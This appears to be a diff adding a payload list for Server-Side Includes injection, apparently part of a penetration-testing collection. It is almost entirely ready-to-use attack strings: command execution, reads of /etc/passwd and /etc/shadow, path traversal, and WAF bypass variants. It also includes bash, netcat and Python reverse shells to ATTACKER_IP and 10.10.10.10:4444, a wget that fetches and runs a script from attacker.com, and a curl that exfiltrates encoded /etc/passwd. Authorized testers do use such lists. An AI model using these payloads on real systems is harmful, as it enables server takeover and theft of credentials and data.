@@ -1,0 +1,293 @@
+# SSI (Server-Side Includes) Injection Payloads
+
+## ========================================
+## BASIC SSI INJECTION
+## ========================================
+
+# Echo command
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="LAST_MODIFIED" -->
+
+# Execute commands
+<!--#exec cmd="whoami" -->
+<!--#exec cmd="ls -la" -->
+<!--#exec cmd="cat /etc/passwd" -->
+
+## ========================================
+## ENVIRONMENT VARIABLES
+## ========================================
+
+# Display environment
+<!--#echo var="SERVER_SOFTWARE" -->
+<!--#echo var="SERVER_NAME" -->
+<!--#echo var="GATEWAY_INTERFACE" -->
+<!--#echo var="SERVER_PROTOCOL" -->
+<!--#echo var="SERVER_PORT" -->
+<!--#echo var="REQUEST_METHOD" -->
+<!--#echo var="PATH_INFO" -->
+<!--#echo var="REMOTE_ADDR" -->
+<!--#echo var="REMOTE_HOST" -->
+<!--#echo var="REMOTE_USER" -->
+<!--#echo var="REMOTE_IDENT" -->
+<!--#echo var="CONTENT_TYPE" -->
+<!--#echo var="HTTP_ACCEPT" -->
+<!--#echo var="HTTP_USER_AGENT" -->
+<!--#echo var="HTTP_REFERER" -->
+<!--#echo var="QUERY_STRING" -->
+
+## ========================================
+## FILE INCLUSION
+## ========================================
+
+# Include files
+<!--#include file="/etc/passwd" -->
+<!--#include file="../../../etc/passwd" -->
+<!--#include virtual="/etc/passwd" -->
+
+# Include web files
+<!--#include file="config.php" -->
+<!--#include file="/var/www/html/config.inc.php" -->
+
+## ========================================
+## COMMAND EXECUTION
+## ========================================
+
+# System commands
+<!--#exec cmd="id" -->
+<!--#exec cmd="uname -a" -->
+<!--#exec cmd="pwd" -->
+<!--#exec cmd="ls -la" -->
+<!--#exec cmd="cat /etc/passwd" -->
+
+# Reverse shell
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" -->
+<!--#exec cmd="nc -e /bin/bash ATTACKER_IP PORT" -->
+<!--#exec cmd="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" -->
+
+## ========================================
+## CGI EXECUTION
+## ========================================
+
+# Execute CGI script
+<!--#exec cgi="/cgi-bin/script.cgi" -->
+
+## ========================================
+## FILE OPERATIONS
+## ========================================
+
+# Show file size
+<!--#fsize file="index.html" -->
+<!--#fsize virtual="/path/to/file" -->
+
+# Show last modified
+<!--#flastmod file="index.html" -->
+<!--#flastmod virtual="/path/to/file" -->
+
+## ========================================
+## CONFIGURATION
+## ========================================
+
+# Set variables
+<!--#set var="test" value="value" -->
+<!--#echo var="test" -->
+
+# Set error message
+<!--#config errmsg="Custom error message" -->
+
+# Set time format
+<!--#config timefmt="%A %B %d, %Y" -->
+
+# Set size format
+<!--#config sizefmt="bytes" -->
+
+## ========================================
+## CONDITIONAL STATEMENTS
+## ========================================
+
+# If statement
+<!--#if expr="$QUERY_STRING = test" -->
+  Content if true
+<!--#endif -->
+
+# If-else
+<!--#if expr="$REMOTE_ADDR = 192.168.1.1" -->
+  Admin content
+<!--#else -->
+  Regular content
+<!--#endif -->
+
+# Elif
+<!--#if expr="$REQUEST_METHOD = GET" -->
+  GET request
+<!--#elif expr="$REQUEST_METHOD = POST" -->
+  POST request
+<!--#else -->
+  Other method
+<!--#endif -->
+
+## ========================================
+## DETECTION PAYLOADS
+## ========================================
+
+# Basic detection
+<!--#echo var="DATE_LOCAL" -->
+
+# Math test
+<!--#echo var="$((1+1))" -->
+
+# Command test
+<!--#exec cmd="echo test123" -->
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Encoding
+&lt;!--#exec cmd="whoami" --&gt;
+
+# Alternative syntax
+<--#exec cmd="whoami" -->
+<!-#exec cmd="whoami" -->
+<!-- #exec cmd="whoami" -->
+
+# Case variation
+<!--#EXEC CMD="whoami" -->
+<!--#Exec Cmd="whoami" -->
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Read sensitive files
+<!--#include file="/etc/shadow" -->
+<!--#include file="/etc/passwd" -->
+<!--#include file="/var/www/html/config.php" -->
+
+# Example 2: Command execution
+<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh" -->
+
+# Example 3: Data exfiltration
+<!--#exec cmd="curl http://attacker.com/?data=$(cat /etc/passwd | base64)" -->
+
+## ========================================
+## DIRECTORY TRAVERSAL
+## ========================================
+
+# Path traversal
+<!--#include file="../../../etc/passwd" -->
+<!--#include file="../../../../etc/passwd" -->
+<!--#include file="..\..\..\..\windows\win.ini" -->
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Test for SSI execution
+<!--#echo var="DATE_LOCAL" -->
+
+# 2. If working, test command execution
+<!--#exec cmd="whoami" -->
+
+# 3. Test file inclusion
+<!--#include file="/etc/passwd" -->
+
+# 4. Exploit
+Execute commands or read files
+
+## ========================================
+## COMMON INJECTION POINTS
+## ========================================
+
+# HTML comments
+<!-- User input here -->
+
+# Template variables
+{{user_input}}
+
+# File names
+/page?file=test.shtml
+
+# Form fields
+<input value="<!--#echo var='DOCUMENT_NAME'-->">
+
+## ========================================
+## WAF BYPASS
+## ========================================
+
+# Obfuscation
+<! --#exec cmd="whoami" -->
+<!-- #exec cmd="whoami"-->
+
+# Encoding
+HTML entities
+URL encoding
+Unicode
+
+## ========================================
+## REAL-WORLD PAYLOADS
+## ========================================
+
+# Payload 1: Information disclosure
+<!--#echo var="SERVER_SOFTWARE" -->
+<!--#echo var="SERVER_ADMIN" -->
+
+# Payload 2: RCE
+<!--#exec cmd="/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" -->
+
+# Payload 3: File read
+<!--#include virtual="/etc/passwd" -->
+
+## ========================================
+## APACHE SSI
+## ========================================
+
+# Requires .shtml extension or:
+# AddOutputFilter INCLUDES .html
+# Options +Includes
+
+# Test
+<!--#echo var="DOCUMENT_URI" -->
+
+## ========================================
+## NGINX SSI
+## ========================================
+
+# Requires ssi on; in config
+
+# Test
+<!--#echo var="uri" -->
+
+## ========================================
+## IIS SSI
+## ========================================
+
+# .stm or .shtm files
+
+# Test
+<!--#echo var="SERVER_SOFTWARE" -->
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Burp Suite Repeater
+
+# Automated scanning
+- Commix
+- SSImap
+- Custom scripts
+
+# Verification
+curl http://target.com/page.shtml -d "input=<!--#exec cmd='whoami'-->"
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check if:
+- SSI is disabled
+- Input sanitization exists
+- File inclusion is restricted
+- Command execution is blocked
